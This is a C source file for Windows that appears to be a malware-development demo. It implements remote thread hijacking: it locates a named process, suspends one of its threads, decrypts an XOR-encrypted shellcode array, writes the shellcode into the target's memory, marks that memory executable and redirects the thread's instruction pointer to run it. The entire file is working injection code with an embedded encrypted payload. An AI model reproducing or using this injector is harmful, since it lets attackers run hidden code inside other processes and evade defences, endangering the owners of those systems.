#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <Psapi.h>

BOOL DecryptShellcode(_In_ UCHAR Shellcode[], _In_ DWORD dwShellcodeSize, _In_ UCHAR Key[], _In_ DWORD dwKeySize) {
	if (!Shellcode || !Key || !dwKeySize || !dwShellcodeSize) {
		printf("\t[-] DecryptShellcode received invalid parameter(s)!\n");
		return FALSE;
	}

	printf("[#] Press <Enter> to Decrypt the Shellcode!\n");
	getch();

	for (int i = 0, j = 0; i < dwShellcodeSize; i++) {
		Shellcode[i] = Shellcode[i] ^ Key[j++] ^ i;
		if (j == dwKeySize) j = 0;
	}

	printf("[+] Done!\n\n");
	return TRUE;
}

BOOL GetTargetProcessHandleAndId(_In_ LPCWSTR sTargProcName, _Out_ DWORD * dwTargProcessId, _Out_ HANDLE* hTargetProcess) {
	DWORD dwProcessesId[3072];
	DWORD dwRetFunc = NULL;
	HMODULE hModule = NULL;
	LPCWSTR sCurretProcess[1024];

	if (!sTargProcName || !dwTargProcessId || !hTargetProcess) {
		printf("\t[-] GetTargetProcessHandleAndId received invalid parameter(s)!\n");
		return FALSE;
	}

	wprintf(L"[#] Press <Enter> to Search the ID of %s!\n", sTargProcName);
	getch();

	if (!EnumProcesses(dwProcessesId, sizeof(dwProcessesId), &dwRetFunc)) {
		printf("\t[-] EnumProcesses with status: %d\n", GetLastError());
		return FALSE;
	}

	DWORD dwNumberOfPids = dwRetFunc / sizeof(DWORD);
	dwRetFunc = NULL;

	for (DWORD i = 0; i < dwNumberOfPids; i++) {
		*hTargetProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, dwProcessesId[i]);
		if (!*hTargetProcess)
			continue;

		if (!EnumProcessModules(*hTargetProcess, &hModule, sizeof(HMODULE), &dwRetFunc))
			continue;

		if (!GetModuleBaseNameW(*hTargetProcess, hModule, sCurretProcess, sizeof(sCurretProcess) / sizeof(WCHAR)))
			continue;

		if (_wcsicmp(sTargProcName, sCurretProcess) == 0) {
			printf("\t[+] ID of Target Process Is: %d\n", dwProcessesId[i]);
			CloseHandle(*hTargetProcess);
			*hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessesId[i]);
			*dwTargProcessId = dwProcessesId[i];
			break;
		}

		CloseHandle(*hTargetProcess);
	}

	if (!*dwTargProcessId || !*hTargetProcess)
		return FALSE;

	printf("[+] Done!\n\n");
	return TRUE;
}

BOOL GetTargetThreadHandle(_In_ DWORD* dwTargProcessId, _Out_ HANDLE * hTargetThread) {
	HANDLE hSnapShot = NULL;
	THREADENTRY32 sThreadEntry = { .dwSize = sizeof(THREADENTRY32) };
	
	if (!dwTargProcessId || !hTargetThread) {
		printf("\t[-] GetTargetThreadHandle received invalid parameter(s)!\n");
		return FALSE;
	}

	printf("[#] Press <Enter> to Search for a Thread of Process %d!\n", *dwTargProcessId);
	getch();

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (!hSnapShot) {
		printf("\t[-] CreateToolhelp32Snapshot with status: %d \n", GetLastError());
		return FALSE;
	}

	if (!Thread32First(hSnapShot, &sThreadEntry)) {
		printf("\t[-] Thread32First with status: %d\n", GetLastError());
		goto _EndOfFunction;
	}

	do {
		if (sThreadEntry.th32OwnerProcessID == *dwTargProcessId) {
			*hTargetThread = OpenThread(THREAD_ALL_ACCESS, FALSE, sThreadEntry.th32ThreadID);
			printf("\t[+] ID of Target Thread Is: %d\n", sThreadEntry.th32ThreadID);
			break;
		}

	} while (Thread32Next(hSnapShot, &sThreadEntry));

_EndOfFunction:

	if (!*hTargetThread)
		return FALSE;

	printf("[+] Done!\n\n");
	return TRUE;
}

BOOL ShellcodeInjection(_In_ PBYTE pShellcode, _In_ DWORD dwShellcodeSize, _In_ HANDLE* hTargetProcess, _Out_ PVOID* pTargMemPage) {
	DWORD dwFuncRet = NULL;
	BOOL bStatus = TRUE;

	if (!pShellcode || !dwShellcodeSize || !hTargetProcess || !pTargMemPage) {
		printf("\t[-] ShellcodeInjection received invalid parameter(s)!\n");
		return FALSE;
	}

	printf("[#] Press <Enter> to Start the Shellcode Injection!\n");
	getch();

	*pTargMemPage = VirtualAllocEx(*hTargetProcess, NULL, dwShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!*pTargMemPage) {
		printf("\t[-] VirtualAllocEx with status: %d\n", GetLastError());
		return FALSE;
	}

	printf("\t[i] Memory Page Allocated at %p with PAGE_READWRITE Permissions!\n", *pTargMemPage);

	if (!WriteProcessMemory(*hTargetProcess, *pTargMemPage, pShellcode, dwShellcodeSize, &dwFuncRet) || dwFuncRet != dwShellcodeSize) {
		printf("\t[-] WriteProcessMemory with status: %d\n", GetLastError());
		bStatus = FALSE; goto _EndOfFunction;
	}

	printf("\t[i] Shellcode successfully injected!\n");

	if (!VirtualProtectEx(*hTargetProcess, *pTargMemPage, dwShellcodeSize, PAGE_EXECUTE_READ, &dwFuncRet)) {
		printf("\t[-] VirtualProtectEx failed with status: %d\n", GetLastError());
		bStatus = FALSE; goto _EndOfFunction;
	}

	printf("\t[i] Memory Page Permissions changed to PAGE_EXECUTE_READ!\n");

_EndOfFunction:
	if (bStatus)
		printf("[+] Done!\n\n");

	return bStatus;
}

BOOL ThreadHijacking(_In_ HANDLE* pTargThread, _In_ PVOID* pTarMemPage) {
	CONTEXT Ctxt = { .ContextFlags = CONTEXT_CONTROL };

	if (!pTargThread || !pTarMemPage) {
		printf("\t[-] ThreadHijacking received invalid parameter(s)!\n");
		return FALSE;
	}

	printf("[#] Press <Enter> to Start Remote Thread Hijacking\n!");
	getch();

	if (!GetThreadContext(*pTargThread, &Ctxt)) {
		printf("\t[-] GetThreadContext failed with status: %d\n", GetLastError());
		return FALSE;
	}

	Ctxt.Rip = *pTarMemPage;

	if (!SetThreadContext(*pTargThread, &Ctxt)) {
		printf("\t[-] SetThreadContext failed with status: %d\n", GetLastError());
		return FALSE;
	}

	printf("\t[i] RIP/EIP Modified to %p Location\n", *pTarMemPage);

	printf("[+] Done!\n\n");
	return TRUE;
}

int wmain(const int argc, const wchar_t* argv[]) {
	DWORD dwTargProcessId = NULL;
	HANDLE hTargetThread = NULL;
	HANDLE hTargetProcess = NULL;
	LPVOID pTargMemPage = NULL;
	const UCHAR Key[] = {
		0x1B, 0x75, 0x89, 0x3C, 0xE, 0x5C, 0x66, 0xEC, 0x16, 0x2F, 0x7F, 0xE9, 0x51, 0x31, 0xFD, 0xF
	};
	UCHAR Shellcode[] = {
		0xE7, 0x3C, 0x08, 0xDB, 0xFA, 0xB1, 0xA0, 0xEB, 0x1E, 0x26, 0x34, 0xB3, 0x1C, 0x6C, 0xA1, 0x51,
		0x5D, 0x2C, 0xAA, 0xFD, 0x7F, 0x01, 0xFB, 0xA9, 0x6E, 0x7E, 0xEE, 0xA0, 0x55, 0x64, 0x68, 0x42,
		0x1B, 0x1C, 0x20, 0x6D, 0x7A, 0x31, 0x4F, 0x7C, 0x74, 0x4C, 0x18, 0xF3, 0xB4, 0x54, 0xE2, 0xE0,
		0x87, 0x78, 0xDA, 0x73, 0x38, 0x45, 0x70, 0x9A, 0xEF, 0xDF, 0x48, 0x93, 0x6C, 0xCD, 0x21, 0xDD,
		0x09, 0x75, 0x9A, 0x37, 0xC1, 0x4B, 0x00, 0x20, 0x1C, 0x5A, 0x7D, 0xA3, 0xCD, 0xF7, 0x33, 0xC8,
		0x4B, 0x24, 0xDB, 0x27, 0xDF, 0xC9, 0x44, 0xDC, 0x06, 0x77, 0xF5, 0xE2, 0x86, 0x24, 0xBB, 0x14,
		0xF0, 0x54, 0xCB, 0x16, 0x6B, 0xE9, 0xE3, 0xDD, 0x36, 0xB9, 0xDC, 0xC3, 0xB6, 0x68, 0x1B, 0x28,
		0x6A, 0xD2, 0xB6, 0x7E, 0xB3, 0x61, 0x21, 0x5B, 0xC2, 0x17, 0xC4, 0x5B, 0x20, 0x0D, 0x82, 0xB1,
		0xA3, 0x14, 0x7E, 0x4E, 0xC6, 0xDA, 0xAC, 0x4F, 0x96, 0xE3, 0xCC, 0xB3, 0xA8, 0x64, 0x2B, 0xC4,
		0x00, 0xA4, 0x3F, 0xE6, 0x9B, 0x19, 0x96, 0x3A, 0x05, 0xBA, 0xAD, 0x36, 0x46, 0xEC, 0x7F, 0xD9,
		0xBA, 0x04, 0x6A, 0x14, 0xAE, 0x71, 0x88, 0x4A, 0x6E, 0xC7, 0x8D, 0x03, 0xA5, 0xC2, 0x0A, 0xFA,
		0xEA, 0x9C, 0x7A, 0xD6, 0xFB, 0xB3, 0x98, 0xD8, 0x42, 0xB6, 0x84, 0x00, 0x12, 0x6C, 0x1B, 0xF1,
		0x82, 0xEE, 0x03, 0x74, 0xD8, 0x70, 0xF7, 0xD4, 0x21, 0x19, 0xE8, 0x6A, 0x27, 0xFD, 0x33, 0xC0,
		0xCB, 0xA4, 0x5B, 0xEF, 0xDA, 0xC1, 0x3D, 0xB6, 0xCF, 0xF7, 0xA5, 0x32, 0xCC, 0x56, 0x12, 0x5B,
		0x94, 0x13, 0x94, 0x0A, 0x51, 0x59, 0x9D, 0x21, 0xF4, 0x87, 0x2F, 0xA4, 0x28, 0x61, 0x8E, 0x1F,
		0x3E, 0xCC, 0xF8, 0x0B, 0xD2, 0x95, 0x96, 0x67, 0xE4, 0x56, 0x7E, 0xF2, 0xD8, 0xC9, 0xB8, 0xB7,
		0x08, 0x06, 0xE4, 0x55, 0x0A, 0x00, 0x21, 0x62, 0xC4, 0xD9, 0xA0, 0x81, 0x3C, 0x50, 0x90, 0x00
	};
	DWORD dwShellcodeSize = sizeof(Shellcode);

	if (argc < 2) {
		wprintf(L"[-] \"%s\" Usage: <TARGET PROCESS NAME>!\n", argv[0]);
		return 1;
	}

	if (!GetTargetProcessHandleAndId(argv[1], &dwTargProcessId, &hTargetProcess)) {
		printf("[-] Fail!\n\n");
		return 1;
	}

	if (!GetTargetThreadHandle(&dwTargProcessId, &hTargetThread)) {
		printf("[-] Fail!\n\n");
		goto _EndOfFunction;
	}

	printf("[#] Suspending Target Thread!\n");
	SuspendThread(hTargetThread);
	printf("[+] Done!\n\n");

	if (!DecryptShellcode(Shellcode, dwShellcodeSize, Key, sizeof(Key))) {
		printf("[-] Fail!\n\n");
		goto _EndOfFunction;
	}

	if (!ShellcodeInjection(Shellcode, dwShellcodeSize, &hTargetProcess, &pTargMemPage)) {
		printf("[-] Fail!\n\n");
		goto _EndOfFunction;
	}

	if (!ThreadHijacking(&hTargetThread, &pTargMemPage)) {
		printf("[-] Fail!\n");
		goto _EndOfFunction;
	}

	printf("[#] Press <Enter> to Resume the Thread\n!");
	getch();
	ResumeThread(hTargetThread);
	WaitForSingleObject(hTargetThread, INFINITE);
	printf("[+] Done!\n\n");


	printf("[#] Press <Enter> to Exit\n!");
	getch();


_EndOfFunction:
	if (pTargMemPage)
		VirtualFreeEx(hTargetProcess, pTargMemPage, 0, MEM_RELEASE | MEM_DECOMMIT);	
	
	if (hTargetThread)
		CloseHandle(hTargetThread);

	if (hTargetProcess)
		CloseHandle(hTargetProcess);
	return 0;
}